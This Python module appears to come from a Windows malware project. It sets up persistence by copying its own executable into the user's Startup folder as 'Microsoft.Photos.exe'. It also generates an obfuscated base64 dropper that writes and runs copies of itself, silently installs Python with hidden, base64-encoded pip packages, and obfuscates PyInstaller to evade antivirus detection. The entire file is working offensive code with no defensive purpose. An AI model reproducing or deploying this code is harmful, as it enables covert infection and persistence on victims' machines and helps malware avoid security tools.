import base64
import os
import random
import shutil
import subprocess
import time
from Utils.helpers import is_os_64bit, random_string, run_pwsh, is_msvc_exist, \
    download_file, extract_zip, get_current_file_path, base64_encode_file, \
    find_python_path, ctypes_update_system,is_admin
from .pyinstaller_obfuscate.main import obfuscate_files
from .pyinstaller_obfuscate.obfuscationModule.main import Obfuscate


def download_pyinstaller(download_path: str):
    """
    :param download_path: the assumed file name on the local system when downloaded
    we return False, or path to the extracted_file
    clean_path is the download_path --> but without the .zip suffix,
    so clean path is actually the extraction dir!
    """
    URL = "https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v4.7.zip"
    clean_path = download_path.replace('.zip', '')
    final_dir = clean_path.split('/')[::-1][0]
    if download_file(download_path, URL):
        # //TODO 1: check if this actually works!
        print(final_dir)
        if extract_zip(f"c:/users/{os.getlogin()}/appdata/local/temp", download_path):
            return f"c:/users/{os.getlogin()}/appdata/local/temp/{final_dir}"
    return False


def persist_in_startup():
    """no matter what we succeed to do just copy the current running exe to the startup folder
    //TODO 3: find another creative ways to persist in the FS and evade AV"""
    base64_of_ourself = base64_encode_file(get_current_file_path())  # str
    name_for_copy = "Microsoft.Photos.exe"  # //TODO 2: add here names of unsigned files in windows with random.choice.
    startup_folder = f"c:/users/{os.getlogin()}/appdata/roaming/microsoft/windows/start menu/programs/startup/{name_for_copy}"
    with open(startup_folder, 'wb') as new_file:
        new_file.write(base64.b64decode(base64_of_ourself.encode()))  # //TODO 4: Check if this working.
    return True


def create_dropper():
    """
    if we don't obfuscated pyinstaller, and we don't have admin rights
    we are gonna create a dropper with embedded base64 of our main exe.
    this dropper is kind'a in stupid way
    """
    current_file = get_current_file_path()
    obfuscated_base64_name = random_string(random.randrange(8, 17))
    obfuscated_main_function = random_string(random.randrange(9, 15))
    obfuscated_file_var = random_string(random.randrange(7, 17))
    obfuscated_file_name = random_string(random.randrange(6, 17))
    obfuscated_startup_folder = f"'c:/users/{os.getlogin()}/" \
                                f"appdata/roaming/microsoft/" \
                                f"windows/start menu/programs/startup/{obfuscated_file_name + '.exe'}'"
    backup_of_file = f"'c:/users/{os.getlogin()}/appdata/local/temp/{obfuscated_file_name + '.exe'}'"
    our_base64_file = f'"""{base64_encode_file(current_file)}"""'
    code = f"""
from base64 import b64decode as {obfuscated_base64_name}
from os import system
our_code = {our_base64_file}
def {obfuscated_main_function}():
    with open({obfuscated_startup_folder},'wb') as {obfuscated_file_var}:
        {obfuscated_file_var}.write({obfuscated_base64_name}(our_code))
    with open({backup_of_file},'wb') as {obfuscated_file_var}:
        {obfuscated_file_var}.write({obfuscated_base64_name}(our_code))
    system({backup_of_file})
{obfuscated_main_function}()
    """
    dropper_py_file = obfuscated_startup_folder.replace('.exe', '.py').replace("'", '')
    with open(dropper_py_file, 'w') as dropper_file:
        dropper_file.write(code)
    print(dropper_py_file)
    python_path = find_python_path()
    check_if_pyinstaller_installed = f"{python_path} -m pip list"
    print(run_pwsh(check_if_pyinstaller_installed).lower())
    if 'pyinstaller' in run_pwsh(check_if_pyinstaller_installed).lower():
        pyinstaller_path = python_path.replace('python.exe', 'scripts/pyinstaller.exe')
        install_it = run_pwsh(
            f"{pyinstaller_path} --onefile --icon=NONE '{dropper_py_file}' --distpath '{os.path.dirname(dropper_py_file)}'")
        print(install_it)
        # //TODO: find a way to check if the install was success or not
    os.remove(dropper_py_file)  # remove the python dropper code.


def get_pyinstaller(pythonPath: str, admin=True, failed_obfuscate=None):
    """
    :param str pythonPath: abs path to python.exe}
    :param bool admin: specify if we got admin permissions.
    //TODO 5: create 3 functions from this one. one for each condition.
    """
    PATH = f"c:/users/{os.getlogin()}/appdata/local/temp/pyinstaller-4.7.zip"
    pyinstaller_dir = PATH.replace('.zip', '')

    if failed_obfuscate:
        if os.path.exists(pyinstaller_dir):
            time.sleep(5)  # we wait to make sure we have no handle of the obfuscation active
            try:
                shutil.rmtree(pyinstaller_dir)
            except Exception as e:
                pass
        randPyinstaller = random_string(5)
        extract_zip(pyinstaller_dir+randPyinstaller, PATH)
        extraction_location = pyinstaller_dir+randPyinstaller+\
                              '/'+pyinstaller_dir.split('/')[::-1][0].replace('.zip','')
        os.chdir(extraction_location)
        os.system(f"{pythonPath} setup.py install")
        # we install python WITHOUT obfuscatio
        return
    if os.path.exists(PATH):
        if os.path.exists(pyinstaller_dir):
            shutil.rmtree(pyinstaller_dir)
        extract_zip(pyinstaller_dir, PATH)
    if not download_pyinstaller(PATH):
        # assume pyinstaller extracted in the PATH
        print("[*] Unknown error in extracting and downloading pyinstaller")
    if admin:
        if is_msvc_exist():
            if Obfuscate(base_dir=f"c:/users/{os.getlogin()}/appdata/local/temp/", python_path=pythonPath).obfuscate():
                return
        else:
            gcc = "https://github.com/brechtsanders/winlibs_mingw/releases/download/11.2.0-9.0.0-msvcrt-r6/winlibs-x86_64-posix-seh-gcc-11.2.0-mingw-w64-9.0.0-r6.zip"
            PATH = f"c:/users/{os.getlogin()}/appdata/local/temp/gcc.zip"
            GCC_EXTRACTION_PATH = "c:/MinGW"
            if os.path.exists(PATH):
                os.remove(PATH)
            if os.path.exists(GCC_EXTRACTION_PATH):
                shutil.rmtree(GCC_EXTRACTION_PATH)
            if download_file(path=PATH, URL=gcc):
                extract_zip(extraction_path=GCC_EXTRACTION_PATH, file_to_extract=PATH)
            os.system(r'setx PATH "C:\MinGW\mingw64\bin;%PATH%"')
            ctypes_update_system()
            if Obfuscate(base_dir=f"c:/users/{os.getlogin()}/appdata/local/temp/", python_path=pythonPath).obfuscate():
                obfuscate_files(extraction_path=f"c:/users/{os.getlogin()}/appdata/local/temp/", name="test",
                                base_path=f"c:/users/{os.getlogin()}/appdata/local/temp/try_this",
                                pythonPath=pythonPath)
            else:
                return get_pyinstaller(pythonPath, failed_obfuscate=True)
            # get gcc?
            pass
    # no admin
    if is_msvc_exist():
        # assume your are not admin, but pyinstaller exist and you have msvc
        # TODO 6:// detect other C COMPILERS
        return
    # IF WE GOT HERE. WE HAVE NO C COMPILERS AND NO ADMIN RIGHTS.
    # WE SHOULD JUST OBFUSCATE OUR CODE,AND USE PYINSTALLER TO INSTALL IT.

    pass


def pip_install(new_path=None):
    # base64 encode&decode all commands here on runtime, to prevent obfuscation from obfuscating the packages to install
    """
    :param new_path: new path for pytohn.exe (called new_path as we assume we installed python!)
    to_install is base64 encoded list of python packages to install with git
     //TODO 7: change new_path name and arch to something more obious
    """
    to_install = "Y3J5cHRvZ3JhcGh5IHRpbnlhZXMgbmV0aWZhY2VzIHJlcXVlc3RzIHBzdXRpbCBwYXRobGliMiB3aGVlbA=="
    if new_path:
        subprocess.run(
            f"{new_path} -m pip install --upgrade pip")
        subprocess.run(
            f"{new_path} -m pip install {base64.b64decode(to_install.encode()).decode()}")
        return 1
    subprocess.run(
        f"c:/users/{os.getlogin()}/appdata/local/programs/python/python38/python.exe -m pip install --upgrade pip")
    subprocess.run(
        f"c:/users/{os.getlogin()}/appdata/local/programs/python/python38/python.exe -m pip install {base64.b64decode(to_install.encode()).decode()}")
    return 1


def install_python():
    """
    this function gets called if we didn't find any python installed.
    we can install python with user and admin rights, here it's user only install!
    """
    py64_url = "https://www.python.org/ftp/python/3.8.1/python-3.8.1-amd64.exe"
    py32_url = "https://www.python.org/ftp/python/3.8.1/python-3.8.1.exe"
    InstallAllUsers = 0 if not is_admin else 1
    url = py64_url if is_os_64bit() else py32_url
    rand_py = f'c:/users/{os.getlogin()}/appdata/local/temp/python{random.randrange(111, 9999999)}.exe'
    install_python_command =  f"{rand_py} /quiet InstallAllUsers={InstallAllUsers} Include_launcher=0 PrependPath=1 Include_test=0"
    if download_file(rand_py, url):
        subprocess.run(install_python_command)
    os.remove(rand_py)
    if find_python_path():
        pip_install()
        return True
    return False
